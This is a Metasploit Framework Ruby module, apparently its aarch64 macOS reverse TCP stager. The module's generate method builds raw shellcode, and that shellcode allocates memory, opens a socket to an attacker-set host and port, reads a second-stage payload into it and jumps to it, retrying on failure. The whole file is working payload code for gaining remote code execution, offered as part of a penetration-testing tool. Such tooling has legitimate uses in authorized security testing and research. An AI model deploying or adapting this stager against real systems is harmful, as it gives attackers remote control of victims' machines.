##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# ReverseTcp
# ----------
#
# Osx reverse TCP stager.
#
###
module MetasploitModule
  CachedSize = 328

  include Msf::Payload::Stager

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse TCP Stager',
        'Description' => 'Connect back to the attacker',
        'Author' => 'usiegl00',
        'License' => MSF_LICENSE,
        'Platform' => 'osx',
        'Arch' => ARCH_AARCH64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Stager' => { 'RequiresMidstager' => false },
        'Convention' => 'sockedi'
      )
    )
  end

  def generate(_opts = {})
    encoded_port = [datastore['LPORT'].to_i, 2].pack('vv').unpack('N').first
    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first
    retry_count = datastore['StagerRetryCount']
    seconds = datastore['StagerRetryWait']
    sleep_seconds = seconds.to_i
    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i

    payload = [
      # Generated from external/source/shellcode/osx/aarch64/stager_sock_reverse.s
      # <_main>:
      0xaa1f03e0, # mov	x0, xzr
      0xd2802901, # mov	x1, #328
      0xd2800042, # mov	x2, #2
      0xd2820043, # mov	x3, #4098
      0xaa3f03e4, # mvn	x4, xzr
      0xaa1f03e5, # mov	x5, xzr
      0x580007d0, # ldr	x16, 0x100003f80 <sleep_seconds+0x8>
      0xd4000001, # svc	#0
      0xb100041f, # cmn	x0, #1
      0x54000600, # b.eq	0x100003f54 <failed>
      0xaa0003ec, # mov	x12, x0
      0xd280000a, # mov	x10, #0
      0x1000064b, # adr	x11, #200
      0xf940016b, # ldr	x11, [x11]
      # <socket>:
      0xd2800040, # mov	x0, #2
      0xd2800021, # mov	x1, #1
      0xd2800002, # mov	x2, #0
      0x580006b0, # ldr	x16, 0x100003f88 <sleep_seconds+0x10>
      0xd4000001, # svc	#0
      0xaa0003ed, # mov	x13, x0
      0x10000501, # adr	x1, #160
      0xf9400021, # ldr	x1, [x1]
      0xf81f8fe1, # str	x1, [sp, #-8]!
      0x910003e1, # mov	x1, sp
      0xd2800202, # mov	x2, #16
      0x580005f0, # ldr	x16, 0x100003f90 <sleep_seconds+0x18>
      0xd4000001, # svc	#0
      0xaa0d03e0, # mov	x0, x13
      0xaa0c03e1, # mov	x1, x12
      0xd2802902, # mov	x2, #328
      0xd2800803, # mov	x3, #64
      0xaa1f03e4, # mov	x4, xzr
      0xaa1f03e5, # mov	x5, xzr
      0x58000530, # ldr	x16, 0x100003f98 <sleep_seconds+0x20>
      0xd4000001, # svc	#0
      0xaa0c03e0, # mov	x0, x12
      0xd2802901, # mov	x1, #328
      0xd28000a2, # mov	x2, #5
      0x580004d0, # ldr	x16, 0x100003fa0 <sleep_seconds+0x28>
      0xd4000001, # svc	#0
      0xd61f0180, # br	x12
      # <retry>:
      0xd100056b, # sub	x11, x11, #1
      0xf100017f, # cmp	x11, #0
      0x540001c0, # b.eq	0x100003f54 <failed>
      0xd2800000, # mov	x0, #0
      0xd2800001, # mov	x1, #0
      0x10000242, # adr	x2, #72
      0xf9400042, # ldr	x2, [x2]
      0x10000243, # adr	x3, #72
      0xf9400063, # ldr	x3, [x3]
      0xa9bf0be3, # stp	x3, x2, [sp, #-16]!
      0x910003e4, # mov	x4, sp
      0xd2800002, # mov	x2, #0
      0xd2800003, # mov	x3, #0
      0x58000310, # ldr	x16, 0x100003fa8 <sleep_seconds+0x30>
      0xd4000001, # svc	#0
      0x54ffface, # b.al	0x100003ea8 <socket>
      # <failed>:
      0xd2800020, # mov	x0, #1
      0x580002d0, # ldr	x16, 0x100003fb0 <sleep_seconds+0x38>
      0xd4000001, # svc	#0
      # <caddr>:
      encoded_port, # ldr	d2, 0x100025f60 <SYS_MMAP+0xfe025e9b>
      encoded_host, # <unknown>
      # <retry_count>:
      retry_count, # udf	#16962
      0x00000000, # udf	#16962
      # <sleep_nanoseconds>:
      0x00000000, # udf	#17219
      sleep_nanoseconds, # udf	#17219
      # <sleep_seconds>:
      0x00000000, # udf	#17476
      sleep_seconds, # udf	#17476
      0x020000c5, # <unknown>
      0x00000000, # udf	#0
      0x02000061, # <unknown>
      0x00000000, # udf	#0
      0x02000062, # <unknown>
      0x00000000, # udf	#0
      0x0200001d, # <unknown>
      0x00000000, # udf	#0
      0x0200004a, # <unknown>
      0x00000000, # udf	#0
      0x0200005d, # <unknown>
      0x00000000, # udf	#0
      0x02000001, # <unknown>
      0x00000000, # udf	#0
    ].pack('V*')
    return payload
  end
end
